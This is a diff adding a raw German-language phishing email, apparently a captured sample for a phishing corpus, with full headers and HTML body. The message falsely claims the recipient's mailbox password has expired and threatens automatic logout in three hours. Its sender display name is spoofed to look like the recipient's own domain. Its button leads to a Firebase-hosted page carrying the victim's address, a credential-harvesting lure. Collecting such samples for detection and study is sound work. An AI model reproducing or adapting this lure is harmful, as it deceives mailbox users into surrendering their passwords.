@@ -1,0 +1,160 @@
+Received: from in02.mxguardian.net ([172.16.2.103])
+	by localhost (cf02.mxguardian.net [172.16.2.92]) (MXG, port 10024)
+	with ESMTP id tw-mRAC14zoN for <redacted@example.com>;
+	Thu, 19 Dec 2024 04:34:36 +0000 (UTC)
+Received: from mail0.debge.ooguy.com (unknown [77.83.199.169])
+	by in02.mxguardian.net (Postfix) with ESMTPS id 723BC74C1E
+	for <redacted@example.com>; Thu, 19 Dec 2024 04:34:35 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=debge.ooguy.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=info@debge.ooguy.com;
+ bh=DpBYVRliUPNprrhzJUXuYedsLq86plGJyRsHOA3oXIo=;
+ b=Rq/Fef5fbWjf5bIGuWGXBvraWeOoqX8zoMFpQcL/FCqplsq8ICrIWnIRpD0itMy2k79kT3w1D0cS
+   lC9EY2hZcBwXPzAl8TDEERyUznE8rbaKBHDRb8XlTbzNa3zLE0fGtCy8JkasDj9u4nuQn/mxTqsq
+   w0rp6MVMuxN+p1ikDjg=
+From: "    example.com " <info@debge.ooguy.com>
+To: "REDACTED" <recipient@example.com>
+Subject: =?UTF-8?B?SGFuZGx1bmcgZXJmb3JkZXJsaWNoOiBJaHIgTWFpbGJveC1QYXNzd29ydCBpc3QgaGV1dGUgYWJnZWxhdWZlbiB1bmQgbXVzcyB6dXLDvGNrZ2VzZXR6dCB3ZXJkZW4gLSA=?=example.com
+Date: 19 Dec 2024 04:34:33 +0000
+Message-ID: <20241219043433.C19A99360D6ED8F2@debge.ooguy.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+Content-length: 7495
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<p>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+
+<p>
+
+<table width=3D"100%" align=3D"center" class=3D"v1row v1row-1" style=3D"bor=
+der-collapse: collapse; box-sizing: border-box;" border=3D"0" cellspacing=
+=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<table width=3D"480" align=3D"center" class=3D"v1row-content" style=3D"widt=
+h: 480px; color: rgb(0, 0, 0); border-collapse: collapse; box-sizing: borde=
+r-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td width=3D"100%" class=3D"v1column" style=3D"border-width: 0px; text-alig=
+n: left; padding-top: 5px; padding-bottom: 5px; font-weight: 400; vertical-=
+align: top; box-sizing: border-box;">
+<table width=3D"100%" class=3D"v1text_block" style=3D"border-collapse: coll=
+apse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"10">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div style=3D"font-family: sans-serif; box-sizing: border-box;">
+<div style=3D"color: rgb(57, 61, 71); line-height: 1.2; font-family: Tahoma=
+, Verdana, Segoe, sans-serif; font-size: 14px; box-sizing: border-box;">
+<p style=3D"margin: 0px; text-align: center; font-size: 14px; box-sizing: b=
+order-box;"><span style=3D"font-size: 18px; box-sizing: border-box;">Ihr Ma=
+ilbox "<strong style=3D"font-weight: bolder; box-sizing: border-box;">redac=
+ted@example.com</strong>" Passwort l&auml;uft ab!</span></p></div></div></t=
+d></tr></tbody></table>
+<table width=3D"100%" class=3D"v1divider_block" style=3D"border-collapse: c=
+ollapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpaddin=
+g=3D"10">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div align=3D"center" style=3D"box-sizing: border-box;">
+<table width=3D"100%" style=3D"border-collapse: collapse; box-sizing: borde=
+r-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td class=3D"v1divider_inner" style=3D"line-height: 1px; font-size: 1px; bo=
+rder-top-color: rgb(187, 187, 187); border-top-width: 2px; border-top-style=
+: solid; box-sizing: border-box;"><span style=3D"box-sizing: border-box;">&=
+#8202;</span></td></tr></tbody></table></div></td></tr></tbody></table>
+<table width=3D"100%" class=3D"v1text_block" style=3D"border-collapse: coll=
+apse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"5">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div style=3D"font-family: Tahoma, Verdana, sans-serif; box-sizing: border-=
+box;">
+<div style=3D"color: rgb(57, 61, 71); line-height: 1.5; font-family: Tahoma=
+, Verdana, Segoe, sans-serif; font-size: 12px; box-sizing: border-box;">
+<p style=3D"margin: 0px; font-size: 14px; box-sizing: border-box;">&nbsp;</=
+p>
+<p style=3D"margin: 0px; font-size: 14px; box-sizing: border-box;"><span st=
+yle=3D"font-size: 14px; box-sizing: border-box;">Das Passwort f&uuml;r Ihre=
+ Mailbox &nbsp;redacted@example.com&nbsp; ist abgelaufen.</span></p>
+<p style=3D"margin: 0px; font-size: 14px; box-sizing: border-box;"><br styl=
+e=3D"box-sizing: border-box;"><span style=3D"font-size: 14px; box-sizing: b=
+order-box;">Ein neues Passwort wird vom System generiert.<br style=3D"box-s=
+izing: border-box;"></span><br style=3D"box-sizing: border-box;"><span styl=
+e=3D"font-size: 14px; box-sizing: border-box;">Sie werden genau 3 Stunden n=
+ach dem &Ouml;ffnen dieser E-Mail automatisch abgemeldet.<br style=3D"box-s=
+izing: border-box;"><br style=3D"box-sizing: border-box;"></span>
+</p>
+<p style=3D"margin: 0px; font-size: 14px; box-sizing: border-box;"><span st=
+yle=3D"font-size: 14px; box-sizing: border-box;">Es wird empfohlen, weiterh=
+in Ihr aktuelles Passwort zu verwenden.<br style=3D"box-sizing: border-box;=
+"><br style=3D"box-sizing: border-box;">Um Ihr aktuelles Passwort weiterhin=
+ zu verwenden, verwenden Sie bitte die Schaltfl&auml;che unten.</span></p>
+<p style=3D"margin: 0px; font-size: 14px; box-sizing: border-box;"><br styl=
+e=3D"box-sizing: border-box;"></p></div></div></td></tr></tbody></table>
+<table width=3D"100%" class=3D"v1button_block" style=3D"border-collapse: co=
+llapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"10">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div align=3D"center" style=3D"box-sizing: border-box;">
+<a style=3D"border-radius: 4px; border: 1px solid rgb(138, 59, 143); border=
+-image: none; width: auto; text-align: center; color: rgb(255, 255, 255); p=
+adding-top: 5px; padding-bottom: 5px; font-family: Tahoma, Verdana, Segoe, =
+sans-serif; text-decoration: none; display: inline-block; box-sizing: borde=
+r-box; background-color: rgb(0, 2, 165);"=20
+href=3D"https://firebasestorage.googleapis.com/v0/b/recab-a4f64.appspot.com=
+/o/ingodwetr.html?alt=3Dmedia&amp;token=3D22897d73-8705-42ea-9980-d900a8cf3=
+1c4#redacted@example.com" target=3D"_blank" rel=3D"noreferrer">
+<span style=3D"letter-spacing: normal; padding-right: 20px; padding-left: 2=
+0px; font-size: 16px; display: inline-block; box-sizing: border-box;">
+<span style=3D"line-height: 1.5; font-size: 16px; box-sizing: border-box;">=
+Aktuelles Passwort beibehalten</span></span></a></div></td></tr></tbody></t=
+able>
+<table width=3D"100%" class=3D"v1divider_block" style=3D"border-collapse: c=
+ollapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpaddin=
+g=3D"10">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div align=3D"center" style=3D"box-sizing: border-box;">
+<table width=3D"100%" style=3D"border-collapse: collapse; box-sizing: borde=
+r-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td class=3D"v1divider_inner" style=3D"line-height: 1px; font-size: 1px; bo=
+rder-top-color: rgb(187, 187, 187); border-top-width: 2px; border-top-style=
+: solid; box-sizing: border-box;"><span style=3D"box-sizing: border-box;">&=
+#8202;</span></td></tr></tbody></table></div></td></tr></tbody></table>
+<table width=3D"100%" class=3D"v1text_block" style=3D"border-collapse: coll=
+apse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"10">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div style=3D"font-family: sans-serif; box-sizing: border-box;">
+<div style=3D"color: rgb(57, 61, 71); line-height: 1.2; font-family: Tahoma=
+, Verdana, Segoe, sans-serif; font-size: 14px; box-sizing: border-box;">
+<p style=3D"margin: 0px; text-align: center; box-sizing: border-box;">E-Mai=
+l wird von &nbsp;example.com generiert E-Mail-Server f&uuml;r redacted@exam=
+ple.com</p></div></div></td></tr></tbody></table></td></tr></tbody></table>=
+</td></tr></tbody></table><p></p><p></p>
+
+
+</body></html>
